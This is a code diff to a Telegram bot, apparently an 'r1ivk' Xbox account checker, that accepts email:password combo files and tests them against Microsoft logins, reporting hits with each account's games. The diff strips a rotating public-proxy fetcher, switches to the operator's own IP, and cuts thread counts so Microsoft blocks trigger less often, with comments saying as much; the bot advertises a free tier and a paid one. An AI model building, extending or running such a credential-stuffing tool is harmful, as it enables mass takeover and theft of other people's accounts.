@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (DEEP PROFILE & INVENTORY FIX)
+TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (DIRECT LOCAL IP / NO PROXIES)
 """
 
 import os
@@ -62,49 +62,6 @@ def add_user_to_db(user_id):
 active_scans = {}  
 scan_lock = threading.Lock()
 
-# =================== AUTO PROXY FETCHER ===================
-def fetch_fresh_proxies():
-    proxy_sources = [
-        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-        "https://www.proxyscan.io/download?type=http"
-    ]
-    new_proxies = []
-    for src in proxy_sources:
-        try:
-            resp = requests.get(src, timeout=10)
-            if resp.status_code == 200:
-                lines = resp.text.splitlines()
-                for line in lines:
-                    line = line.strip()
-                    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$', line):
-                        new_proxies.append(line)
-        except Exception:
-            continue
-    
-    if new_proxies:
-        with open("good_proxies.txt", "w", encoding="utf-8") as f:
-            f.write("\n".join(list(set(new_proxies))[:500]))
-
-def background_proxy_updater():
-    while True:
-        fetch_fresh_proxies()
-        time.sleep(3600)
-
-threading.Thread(target=background_proxy_updater, daemon=True).start()
-
-PROXIES_LIST = []
-if os.path.exists("good_proxies.txt"):
-    with open("good_proxies.txt", "r", encoding="utf-8") as f:
-        PROXIES_LIST = [line.strip() for line in f if line.strip()]
-
-def get_random_proxy():
-    if not PROXIES_LIST:
-        return None
-    p = random.choice(PROXIES_LIST)
-    if not p.startswith("http"):
-        return {"http": f"http://{p}", "https": f"http://{p}"}
-    return {"http": p, "https": p}
-
 # =================== BYPASS & CORE LOGIC ===================
 def extract_ppft(text):
     patterns = [
@@ -160,9 +117,7 @@ def check_account_turbo(combo, user_state):
         session.mount('https://', adapter)
         session.mount('http://', adapter)
         
-        current_proxy = get_random_proxy()
-        if current_proxy:
-            session.proxies.update(current_proxy)
+        # تم إلغاء البروكسيات واستخدام الـ IP الحقيقي المباشر (Local IP)
 
         session.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
@@ -350,7 +305,7 @@ def check_account_turbo(combo, user_state):
 📦 Games / Products found:"""
             
             if games_list:
-                for idx, g in enumerate(games_list[:15], 1): # يعرض أول 15 لعبة لجعل التقرير مرتباً
+                for idx, g in enumerate(games_list[:15], 1): 
                     hit_block += f"\n  {idx}. {g}"
                 if len(games_list) > 15:
                     hit_block += f"\n  ... and {len(games_list) - 15} more items."
@@ -389,7 +344,7 @@ def send_welcome(message):
     markup.add(btn_checker, btn_status, btn_channel, btn_buy)
     
     welcome_text = (
-        "👑 *Welcome to r1ivk Checker Official Panel (Deep Profile Fixed)* ⚡\n\n"
+        "👑 *Welcome to r1ivk Checker Official Panel (Direct IP Mode)* ⚡\n\n"
         "The fastest and most powerful tool for checking Xbox and Microsoft accounts with accurate profile reading.\n\n"
         "📌 *Choose an option below to get started:*"
     )
@@ -402,7 +357,7 @@ def callback_checker(call):
     markup.add(types.InlineKeyboardButton("❌ Cancel & Return Home", callback_data="back_home"))
     
     text = (
-        "🚀 *Live Checker Mode Activated (Deep Fix)*\n\n"
+        "🚀 *Live Checker Mode Activated (Direct IP)*\n\n"
         "📁 Please send your combo file now in (`.txt`) format where each line is:\n"
         "`email:password`\n\n"
         "📌 *Note:* Free version supports up to **10,000 lines** max.\n"
@@ -478,7 +433,7 @@ def handle_file(message):
         markup.row(types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats"))
         markup.row(types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_home"))
 
-        status_msg = bot.send_message(chat_id, "🔥 *Starting Deep Scan Engine (Optimized Profiles)...*", parse_mode="Markdown", reply_markup=markup)
+        status_msg = bot.send_message(chat_id, "🔥 *Starting Deep Scan Engine (Direct IP Mode)...*", parse_mode="Markdown", reply_markup=markup)
 
         user_state = {
             'chat_id': chat_id,
@@ -536,7 +491,7 @@ Progress: {pct:.1f}%
             pass
 
 def run_turbo_scan(combos, state, msg_id):
-    threads = 15  # تم خفض الثريدز قليلاً لمنع الحظر من مايكروسوفت وضمان قراءة البيانات بدقة
+    threads = 10  # تم ضبط عدد الثريدز خصيصاً للعمل باستقرار وثبات على الآبي الشخصي دون تسبب بحظر فوري
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
         concurrent.futures.wait(futures)
@@ -562,7 +517,7 @@ def run_turbo_scan(combos, state, msg_id):
         result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
         try:
             with open(result_file_path, 'w', encoding='utf-8') as f:
-                f.write("🔥 r1ivk Checker ⚡ Deep Scan Results 🔥\n")
+                f.write("🔥 r1ivk Checker ⚡ Direct IP Scan Results 🔥\n")
                 f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                 f.write("="*50 + "\n\n")
                 f.writelines(state['hits_list'])
@@ -577,5 +532,5 @@ def run_turbo_scan(combos, state, msg_id):
         bot.send_message(state['chat_id'], "⚠️ Scan finished, no matching hits found.")
 
 if __name__ == "__main__":
-    print("[+] r1ivk Checker ⚡ Bot is running with Deep Profile/Inventory Fix...")
+    print("[+] r1ivk Checker ⚡ Bot is running in Direct IP Mode...")
     bot.infinity_polling()
